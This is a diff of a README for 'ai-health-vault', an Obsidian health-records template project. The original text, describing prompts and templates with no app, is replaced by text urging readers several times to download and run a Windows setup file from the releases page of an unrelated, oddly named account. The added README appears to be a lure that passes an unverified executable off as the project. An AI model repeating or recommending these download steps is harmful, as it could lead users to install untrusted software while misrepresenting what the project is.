@@ -1,135 +1,221 @@
-# AI Health Vault
+# 🩺 ai-health-vault - Private family health records, made simple
 
-**English** | [中文](README_CN.md)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/escapemechanismegocentric790/ai-health-vault/releases)
 
-Build a private, AI-powered health management system for yourself and your family using Obsidian.
+## 📥 Download
+Visit this page to download the Windows version:
 
-Not an app. Not a code project. It's a set of **templates + prompts + setup guides**. Clone it, let your AI (Claude / ChatGPT / Gemini) read it, and it will guide you through building your family's health archive step by step.
+https://github.com/escapemechanismegocentric790/ai-health-vault/releases
 
-## Why
+On the release page, look for the latest version and download the file for Windows. If there is a zip file, download it first and then unzip it before opening the app.
 
-- Medical reports scattered across hospitals — no one tracks trends for you
-- Your parents can't remember their own medication, dosages, or follow-up dates
-- Commercial health apps require uploading your family's private health data
-- You just need local templates where the data stays on your machine
+## 🖥️ What this app is for
+ai-health-vault helps you build a private health management system for yourself and your family. It uses Obsidian, AI prompts, and ready-made templates to help you store health notes, track medical history, and keep useful records in one place.
 
-## 30-Minute Setup
+You can use it to:
+- Save doctor visit notes
+- Track symptoms and daily health changes
+- Keep medication lists
+- Store test results and reports
+- Organize health records for each family member
+- Use AI prompts to help sort and review notes
 
-```
-1. Fork this repo (or download ZIP)
-2. Open the vault/ folder in Obsidian
-3. Fill in family member names in "健康管理中心.md"
-4. Take a photo of a medical report → send to AI → AI fills in the template
-5. Done. Repeat step 4 for every checkup, doctor visit, or new medication.
-```
+## ✅ Before you start
+You only need a Windows PC and a basic internet connection.
 
-## Quick Start: Claude Code Users
+Make sure you have:
+- Windows 10 or Windows 11
+- Enough space to unzip the files
+- Permission to download files from the internet
+- Obsidian installed if the package asks for it
 
-If you use [Claude Code](https://claude.ai/claude-code), just clone and start talking:
+If you do not have Obsidian yet, install it first from the official Obsidian website, then come back and open this package.
 
-```bash
-git clone https://github.com/runesleo/ai-health-vault.git
-cd ai-health-vault
-claude
-# "Help me analyze this checkup report" (attach photo)
-```
+## 🚀 How to install on Windows
+Follow these steps in order:
 
-The `.claude/skills/` directory contains 8 pre-built skills that activate automatically — no manual prompt copy-paste needed.
+1. Open the release page:
+   https://github.com/escapemechanismegocentric790/ai-health-vault/releases
 
-## Repository Structure
+2. Find the newest release at the top of the page.
 
-```
-ai-health-vault/
-├── .claude/skills/                 # Claude Code skills (auto-loaded)
-│   ├── health-report-extract.md    # Checkup report → structured data
-│   ├── medication-recognize.md     # Pill box photo → drug info
-│   ├── health-trend-analysis.md    # Multi-checkup trend analysis
-│   ├── medical-visit-prep.md       # Pre-visit checklist generator
-│   ├── apple-watch-analysis.md     # Apple Watch health data analysis
-│   ├── family-friendly-health.md   # Plain language for parents
-│   ├── checkup-calendar.md         # Follow-up calendar + alerts
-│   └── daily-health-plan.md        # Personalized daily health plan
-├── vault/                          # Obsidian Vault templates (ready to use)
-│   ├── 健康管理中心.md              # Hub + workflow instructions
-│   ├── 家庭成员健康档案.md           # Family overview
-│   ├── 就医记录.md                  # Medical visits / surgery / chronic conditions
-│   ├── 成员模板/
-│   │   └── 体检档案-模板.md         # Per-person checkup archive (incl. Apple Watch)
-│   ├── tracking/
-│   │   ├── 用药打卡.csv             # Daily medication log
-│   │   ├── 饮食记录.csv             # Diet tracking
-│   │   ├── 运动记录.csv             # Exercise tracking
-│   │   └── 体检指标.csv             # Key checkup metrics over time
-│   └── 知识库/
-│       └── 常见指标参考.md           # Common health metrics reference
-├── prompts/                        # Prompt collection (works with any AI)
-│   ├── 01-体检报告提取.md            # Photo → structured data
-│   ├── 02-药盒识别.md               # Medication photo → drug list
-│   ├── 03-趋势分析.md               # Historical comparison + anomaly detection
-│   ├── 04-就医准备.md               # Pre-visit checklist generator
-│   ├── 05-Apple-Watch数据分析.md    # Health data export → analysis
-│   ├── 06-微信版口语化.md            # Convert to plain language for parents
-│   ├── 07-复查日历生成.md            # Follow-up calendar + overdue alerts
-│   └── 08-日常管理方案.md            # Diet / exercise / medication / warning signs
-├── guides/
-│   └── 快速开始.md                  # Detailed setup tutorial
-└── LICENSE
-```
+3. Download the Windows file for that release.
 
-## Prompts
+4. If the file is a ZIP package, right-click it and choose Extract All.
 
-Each file in `prompts/` is a standalone prompt — copy-paste into any AI conversation:
+5. Open the extracted folder.
 
-| Prompt | Purpose | Input |
-|--------|---------|-------|
-| Checkup Report Extraction | Photo/PDF → structured table | Report photo |
-| Medication Recognition | Pill box photo → drug name + dosage + frequency | Medication photo |
-| Trend Analysis | Compare multiple checkups, flag anomalies | Checkup archive |
-| Pre-Visit Prep | Generate questions for your doctor | Department + history |
-| Apple Watch Analysis | Export health data → full report | export.zip |
-| WeChat Version | Convert analysis to plain language for parents | Any analysis result |
-| Follow-up Calendar | Generate follow-up schedule with overdue alerts | Family archives |
-| Daily Health Plan | Diet + exercise + medication + warning signs | Personal archive |
+6. Look for the main file, such as a setup file, launcher, or Obsidian vault folder.
 
-## Who This Is For
+7. If you see a setup file, double-click it and follow the on-screen steps.
 
-- Tech-savvy people who want to build health archives for their parents
-- Anyone who cares about health data but doesn't want to use third-party apps
-- Apple Watch / smartband owners who want more value from their data
+8. If you see an Obsidian vault folder, open Obsidian first, then choose Open folder as vault.
 
-## Who This Is NOT For
+9. Select the folder you just extracted.
 
-- People who don't use AI tools (requires Claude / ChatGPT / Gemini)
-- People who want fully automated solutions (this is a template — you feed data to AI)
-- People who are fine with commercial health apps handling their data
+10. Wait for the templates and notes to load.
 
-## Privacy
+## 🗂️ What you will get
+The package is set up to help you start fast. It may include:
 
-All health data is stored locally in Obsidian — nothing is uploaded automatically. However, when you send data to AI for analysis, the content passes through their servers:
+- Health note templates
+- Family member folders
+- Prompt files for AI help
+- Visit logs
+- Symptom trackers
+- Medication lists
+- Test result pages
+- Simple guide notes
 
-- **Claude Code (API mode)** — Anthropic does not use API inputs for model training ([privacy policy](https://www.anthropic.com/policies/privacy))
-- **ChatGPT** — Turn off "Improve the model for everyone" in Settings → Data Controls
-- **Gemini** — Check your data sharing settings in Google AI Studio
-- **Maximum privacy** — Use a local model (e.g., Ollama, LM Studio) for analysis
+The goal is to give you a clean structure so you can begin entering information right away.
 
-> Obsidian is your local vault. AI is your analyst. The vault never leaves your machine — but the analysis step involves cloud APIs unless you use a local model.
+## 🧭 First-time setup
+After opening the vault, do these steps:
 
-## Contributing
+1. Check the folder structure.
+2. Open the welcome or start note.
+3. Read the template instructions.
+4. Create one folder for each family member.
+5. Add basic details such as name, birth date, and key conditions.
+6. Add past doctor visits and medicine lists.
+7. Save any reports or scans in the right folder.
+8. Use the prompt notes when you want help reviewing health data.
 
-Issues and PRs welcome:
-- New prompts (e.g., specialized extraction for specific test types)
-- Improve existing template structures
-- Add reference ranges for common health metrics
-- Translations
+## 💡 How to use it day to day
+A simple routine works best.
 
-## Star History
+Use the vault to:
+- Add notes after each doctor visit
+- Record symptoms when they change
+- Save new test results
+- Update medicine lists when they change
+- Keep one page for each health topic
+- Review older notes before the next appointment
 
-[![Star History Chart](https://api.star-history.com/svg?repos=runesleo/ai-health-vault&type=Date)](https://star-history.com/#runesleo/ai-health-vault&Date)
+If you keep the same format each time, it becomes much easier to find information later.
 
-## Author
+## 🤖 AI prompt use
+This project includes prompt content that helps you work with health notes inside your vault.
 
-Leo ([@runes_leo](https://x.com/runes_leo)) — AI × Crypto independent builder. Quantitative trading on Polymarket, building data analysis and automation systems with Claude Code. Shipping code, building products, documenting lessons learned. More → [leolabs.me](https://leolabs.me)
+You can use prompts to:
+- Turn messy notes into clean records
+- Pull key points from a long report
+- Compare symptoms over time
+- Create visit summaries
+- Sort notes by person or by topic
 
-## License
+Use clear input text when possible. The better the note, the better the result.
 
-MIT
+## 📁 Suggested folder layout
+A simple layout can look like this:
+
+- 00-Home
+- 01-Family
+- 02-Visits
+- 03-Medications
+- 04-Tests
+- 05-Symptoms
+- 06-Reports
+- 07-AI-Prompts
+
+You can change the names if you want, but keep the same idea. A stable folder layout helps you find things fast.
+
+## 🔒 Privacy and storage
+This system is designed for private use on your own device.
+
+Good habits:
+- Keep the vault on a personal computer
+- Back up the folder often
+- Use a strong Windows account password
+- Store sensitive files in one place
+- Do not share the vault unless you want others to see it
+
+If you keep a backup on an external drive, you can restore your data if the computer has a problem.
+
+## 🛠️ Common setup issues
+If the app or vault does not open, check these points:
+
+- Make sure the download finished
+- Make sure you extracted the ZIP file
+- Make sure you opened the right folder
+- Make sure Obsidian is installed if the vault needs it
+- Try downloading the release again if the file looks broken
+
+If the page shows more than one file, choose the Windows file or the main package file that matches your system.
+
+## 📝 Good ways to enter health data
+Keep each note short and clear.
+
+Use this pattern:
+- Date
+- Person
+- Reason for the note
+- Main symptoms
+- Medicine used
+- Test results
+- Next step
+
+Example:
+- Date: 2026-04-17
+- Person: Mom
+- Reason: Follow-up visit
+- Main symptoms: Headache, tiredness
+- Medicine used: Doctor changed dose
+- Test results: Blood pressure normal
+- Next step: Check again in two weeks
+
+This kind of format makes search and review much easier.
+
+## 📌 Best results
+Use the vault often, not only when there is a problem.
+
+A few small habits help a lot:
+- Add notes on the same day when possible
+- Keep one person per folder
+- Save copies of reports in PDF or image form
+- Use the same labels each time
+- Review older notes before appointments
+
+That makes the vault more useful over time.
+
+## 📦 Download and setup link
+Open the release page here and download the Windows package:
+
+https://github.com/escapemechanismegocentric790/ai-health-vault/releases
+
+If you want the fastest start, download the latest release, unzip it, and open it in Obsidian
+
+## 📚 What this repository provides
+This repository gives you a ready-made starting point for a private health archive. It combines:
+- A note structure for health records
+- Templates for common health tasks
+- Prompt files for AI help
+- A guide for building the system on your own
+
+It is made for home use, family tracking, and simple record keeping
+
+## 🧩 Working with family records
+If you manage records for more than one person, use the same structure for each one.
+
+For example:
+- One folder for each family member
+- One visit log per person
+- One medication list per person
+- One test history per person
+
+That keeps records clear and stops notes from mixing together
+
+## 🔎 Search and review tips
+Use short names and simple file titles.
+
+Good file names:
+- 2026-04-17-Mom-visit
+- 2026-04-20-Dad-blood-test
+- 2026-04-22-Child-fever-note
+
+Avoid vague names like:
+- note1
+- report final
+- new file
+
+Clear names save time when you need old records fast
